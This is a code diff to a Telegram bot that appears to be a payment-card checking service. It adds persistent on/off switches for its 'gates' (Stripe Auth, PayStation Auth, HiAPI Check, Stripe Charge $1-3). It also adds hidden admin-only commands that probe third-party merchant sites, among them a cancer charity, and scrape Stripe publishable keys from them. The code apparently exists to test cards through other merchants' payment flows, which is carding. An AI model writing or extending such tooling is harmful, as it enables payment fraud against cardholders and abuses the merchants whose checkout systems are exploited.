@@ -34,6 +34,7 @@ USERS_FILE = os.path.join(DATA_DIR, "tg_users.json")
 STATS_FILE = os.path.join(DATA_DIR, "tg_stats.json")
 ADMINS_FILE = os.path.join(DATA_DIR, "tg_admins.json")
 GATE_STATS_FILE = os.path.join(DATA_DIR, "tg_gate_stats.json")
+GATE_STATUS_FILE = os.path.join(DATA_DIR, "tg_gate_status.json")
 PROXIES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt")
 USER_PROXIES_DIR = os.path.join(DATA_DIR, "user_proxies")
 
@@ -114,6 +115,89 @@ def update_gate_stats(gate, results):
     gs[gate]["total"] += results.get("total", 0)
     gs[gate]["sessions"] += 1
     save_gate_stats(gs)
+
+
+# ============================================================
+#  Gate status — enable/disable gates persistently
+# ============================================================
+def load_gate_status():
+    return _load_json(GATE_STATUS_FILE, {})
+
+def save_gate_status(data):
+    _save_json(GATE_STATUS_FILE, data)
+
+def is_gate_enabled(gate_key):
+    status = load_gate_status()
+    entry = status.get(gate_key, {})
+    return entry.get("enabled", True)
+
+def set_gate_enabled(gate_key, enabled, by_user=None):
+    status = load_gate_status()
+    status[gate_key] = {
+        "enabled": enabled,
+        "updated_at": time.time(),
+        "updated_by": by_user,
+    }
+    save_gate_status(status)
+
+
+# ============================================================
+#  Gate health probes — lightweight ping to check if API alive
+# ============================================================
+GATE_PROBE_MAP = {
+    "auth": {"name": "Stripe Auth (Dilaboards)", "cmd": "/chkapiauth"},
+    "auth2": {"name": "Stripe Auth (Stormx)", "cmd": "/chkapiauth2"},
+    "stc": {"name": "PayStation Auth (NZ)", "cmd": "/chkapistc"},
+    "st1": {"name": "HiAPI Check3", "cmd": "/chkapist1"},
+    "st5": {"name": "HiAPI Check", "cmd": "/chkapist5"},
+    "charge": {"name": "Stripe Charge $1-3", "cmd": "/chkapicharge"},
+}
+
+
+def probe_gate(gate_key):
+    """Probe a gate's underlying API. Returns (alive: bool, latency_ms: int, detail: str)."""
+    start = time.time()
+    try:
+        if gate_key == "auth":
+            resp = requests.get('https://dilaboards.com/en/moj-racun/add-payment-method/',
+                                headers={'User-Agent': _rand_ua()}, timeout=10, allow_redirects=True)
+            alive = resp.status_code == 200 and 'stripe' in resp.text.lower()
+            detail = f"HTTP {resp.status_code}" + (" | Stripe key found" if alive else " | No Stripe key")
+        elif gate_key == "auth2":
+            resp = requests.get('https://stripe.stormx.pw/', headers={'User-Agent': _rand_ua()}, timeout=10)
+            alive = resp.status_code == 200
+            detail = f"HTTP {resp.status_code}"
+        elif gate_key == "stc":
+            resp = requests.get('https://www.cancer.org.nz/', headers={'User-Agent': _rand_ua()}, timeout=10)
+            alive = resp.status_code == 200
+            detail = f"HTTP {resp.status_code}"
+        elif gate_key in ("st1", "st5"):
+            resp = requests.get('https://ck.hiapi.club/', headers={'User-Agent': _rand_ua()}, timeout=10)
+            alive = resp.status_code in (200, 403)
+            detail = f"HTTP {resp.status_code}"
+        elif gate_key == "charge":
+            for merchant in STRIPE_MERCHANTS:
+                try:
+                    resp = requests.get(merchant['url'], headers={'User-Agent': _rand_ua()}, timeout=8, allow_redirects=True)
+                    pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', resp.text)
+                    if pk_match:
+                        latency = int((time.time() - start) * 1000)
+                        return True, latency, f"OK via {merchant['name']} | Stripe key found"
+                except Exception:
+                    continue
+            latency = int((time.time() - start) * 1000)
+            return False, latency, "All merchants unreachable"
+        else:
+            return False, 0, "Unknown gate"
+
+        latency = int((time.time() - start) * 1000)
+        return alive, latency, detail
+    except requests.exceptions.Timeout:
+        return False, int((time.time() - start) * 1000), "Timeout"
+    except requests.exceptions.ConnectionError:
+        return False, int((time.time() - start) * 1000), "Connection refused"
+    except Exception as e:
+        return False, int((time.time() - start) * 1000), str(e)[:60]
 
 
 # ============================================================
@@ -1134,7 +1218,14 @@ def fmt_start(is_adm=False):
             "  /adminlist  — List all admins\n"
             "  /authlist   — List authorized users\n"
             "  /revoke     — Revoke user access\n"
-            "  /broadcast  — Message all users\n\n"
+            "  /broadcast  — Message all users\n"
+            "  /chkapis    — Health check all APIs\n"
+            "  /chkapiauth — Check auth gate\n"
+            "  /chkapiauth2— Check auth2 gate\n"
+            "  /chkapistc  — Check stc gate\n"
+            "  /chkapist1  — Check st1 gate\n"
+            "  /chkapist5  — Check st5 gate\n"
+            "  /chkapicharge— Check charge gate\n\n"
         )
 
     base += (
@@ -1286,6 +1377,43 @@ def handle_callback(update):
         else:
             answer_callback(cb_id, "Not your task.")
 
+    # Gate disable/enable confirmation callbacks
+    elif data.startswith("gate_off_"):
+        if not is_admin(cb_user_id):
+            answer_callback(cb_id, "Admin only.")
+            return
+        gate_key = data.replace("gate_off_", "")
+        set_gate_enabled(gate_key, False, by_user=cb_user_id)
+        gate_name = GATE_PROBE_MAP.get(gate_key, {}).get("name", gate_key)
+        answer_callback(cb_id, f"🔴 {gate_name} disabled!")
+        chat_id = cb.get("message", {}).get("chat", {}).get("id")
+        if chat_id:
+            edit_message(chat_id, cb["message"]["message_id"],
+                f"<b>🔴 {gate_name} — DISABLED</b>\n\n"
+                f"Gate has been turned off. Users cannot use it.\n"
+                f"Use the check command again to re-enable." + FOOTER)
+
+    elif data.startswith("gate_on_"):
+        if not is_admin(cb_user_id):
+            answer_callback(cb_id, "Admin only.")
+            return
+        gate_key = data.replace("gate_on_", "")
+        set_gate_enabled(gate_key, True, by_user=cb_user_id)
+        gate_name = GATE_PROBE_MAP.get(gate_key, {}).get("name", gate_key)
+        answer_callback(cb_id, f"🟢 {gate_name} enabled!")
+        chat_id = cb.get("message", {}).get("chat", {}).get("id")
+        if chat_id:
+            edit_message(chat_id, cb["message"]["message_id"],
+                f"<b>🟢 {gate_name} — ENABLED</b>\n\n"
+                f"Gate is back online for all users." + FOOTER)
+
+    elif data == "gate_keep":
+        answer_callback(cb_id, "No changes made.")
+        chat_id = cb.get("message", {}).get("chat", {}).get("id")
+        if chat_id:
+            edit_message(chat_id, cb["message"]["message_id"],
+                "<b>No changes made.</b>" + FOOTER)
+
 
 def handle_update(update):
     if "callback_query" in update:
@@ -1410,6 +1538,89 @@ def handle_update(update):
         send_message(chat_id, msg_text)
         return
 
+    # --- /chkapi* — Admin-only secret API health checks ---
+    chkapi_cmds = {
+        "/chkapiauth": "auth",
+        "/chkapiauth2": "auth2",
+        "/chkapistc": "stc",
+        "/chkapist1": "st1",
+        "/chkapist5": "st5",
+        "/chkapicharge": "charge",
+    }
+    if text in chkapi_cmds:
+        if not is_admin(user_id):
+            return  # Silent — secret command, don't reveal existence
+        gate_key = chkapi_cmds[text]
+        gate_info = GATE_PROBE_MAP.get(gate_key, {})
+        gate_name = gate_info.get("name", gate_key)
+        currently_enabled = is_gate_enabled(gate_key)
+
+        send_message(chat_id, f"<b>🔍 Probing {gate_name}...</b>")
+        alive, latency, detail = probe_gate(gate_key)
+
+        if alive:
+            status_line = f"🟢 <b>ALIVE</b> — {latency}ms"
+            action_text = "Gate is working. Want to disable it?"
+            buttons = {"inline_keyboard": [[
+                {"text": "🔴 Disable", "callback_data": f"gate_off_{gate_key}"},
+                {"text": "✅ Keep", "callback_data": "gate_keep"},
+            ]]}
+        else:
+            status_line = f"🔴 <b>DEAD</b> — {detail}"
+            if currently_enabled:
+                action_text = "API is down. Disable this gate?"
+                buttons = {"inline_keyboard": [[
+                    {"text": "🔴 Yes, disable", "callback_data": f"gate_off_{gate_key}"},
+                    {"text": "⏳ Keep enabled", "callback_data": "gate_keep"},
+                ]]}
+            else:
+                action_text = "Gate is already disabled. Want to re-enable?"
+                buttons = {"inline_keyboard": [[
+                    {"text": "🟢 Re-enable", "callback_data": f"gate_on_{gate_key}"},
+                    {"text": "❌ Keep off", "callback_data": "gate_keep"},
+                ]]}
+
+        enabled_label = "🟢 Enabled" if currently_enabled else "🔴 Disabled"
+        send_message(chat_id,
+            f"<b>API Check — {gate_name}</b>\n"
+            f"{'─' * 28}\n\n"
+            f"Status: {status_line}\n"
+            f"Detail: <code>{detail}</code>\n"
+            f"Latency: <code>{latency}ms</code>\n"
+            f"Currently: {enabled_label}\n\n"
+            f"{action_text}",
+            reply_markup=buttons)
+        return
+
+    # --- /chkapis — Check ALL gates at once (admin only) ---
+    if text == "/chkapis":
+        if not is_admin(user_id):
+            return  # Silent
+        send_message(chat_id, "<b>🔍 Checking all gates...</b>\nThis may take a moment.")
+        lines_out = [f"<b>🛡️ API Health Report</b>\n{'─' * 28}\n"]
+        any_dead = []
+        for gate_key, info in GATE_PROBE_MAP.items():
+            alive, latency, detail = probe_gate(gate_key)
+            enabled = is_gate_enabled(gate_key)
+            if alive:
+                icon = "🟢"
+                status = f"Alive ({latency}ms)"
+            else:
+                icon = "🔴"
+                status = f"Dead — {detail}"
+                any_dead.append(gate_key)
+            en_icon = "✅" if enabled else "⛔"
+            lines_out.append(f"{icon} <code>{info['cmd']}</code> — {info['name']}\n    {status} | {en_icon} {'On' if enabled else 'Off'}")
+
+        if any_dead:
+            lines_out.append(f"\n⚠️ <b>{len(any_dead)} dead gate(s)</b> — use individual /chkapi* to disable")
+        else:
+            lines_out.append(f"\n✅ <b>All gates operational</b>")
+
+        lines_out.append(FOOTER)
+        send_message(chat_id, "\n".join(lines_out))
+        return
+
     # --- /gates ---
     if text == "/gates":
         GATE_REGISTRY = [
@@ -1424,8 +1635,16 @@ def handle_update(update):
         gs = load_gate_stats()
         lines_out = ["<b>Available Gates</b>\n"]
         for key, cmd, label, live in GATE_REGISTRY:
-            status_icon = "🟢" if live else "🔴"
-            status_text = "Live" if live else "Soon"
+            enabled = is_gate_enabled(key)
+            if not live:
+                status_icon = "🔴"
+                status_text = "Soon"
+            elif not enabled:
+                status_icon = "⛔"
+                status_text = "Disabled"
+            else:
+                status_icon = "🟢"
+                status_text = "Live"
             s = gs.get(key, {})
             total = s.get("total", 0)
             approved = s.get("approved", 0)
@@ -1775,6 +1994,14 @@ def handle_update(update):
     if text in ("/auth", "/auth2", "/stc", "/st1", "/st5", "/charge"):
         gate_map = {"/auth": ("auth", "Stripe Auth (Dilaboards)"), "/auth2": ("auth2", "Stripe Auth (Stormx)"), "/stc": ("stc", "PayStation Auth (NZ)"), "/st1": ("st1", "HiAPI Check3"), "/st5": ("st5", "HiAPI Check"), "/charge": ("charge", "Stripe Charge $1-3")}
         gate, gate_label = gate_map[text]
+
+        # Check if gate is disabled
+        if not is_gate_enabled(gate):
+            send_message(chat_id,
+                f"<b>⛔ {gate_label} — Offline</b>\n\n"
+                f"This gate has been disabled by an admin.\n"
+                f"Try another gate or check /gates for available options." + FOOTER)
+            return
 
         if not is_authorized(user_id):
             send_message(chat_id, fmt_unauthorized())
